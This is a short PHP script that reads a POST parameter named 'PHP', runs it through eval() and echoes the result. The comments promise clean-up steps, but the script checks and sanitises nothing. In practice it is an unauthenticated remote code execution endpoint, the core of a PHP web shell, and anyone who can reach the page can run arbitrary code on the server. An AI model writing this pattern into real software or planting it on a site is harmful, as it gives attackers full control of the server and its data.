<?php
if(isset($_POST["PHP"])){
    function interpret_php($php){
        // clean up $php
        $result = eval($php);
        // clean up $result
        echo $result;
    }
    interpret_php($_POST["PHP"]);
}
?>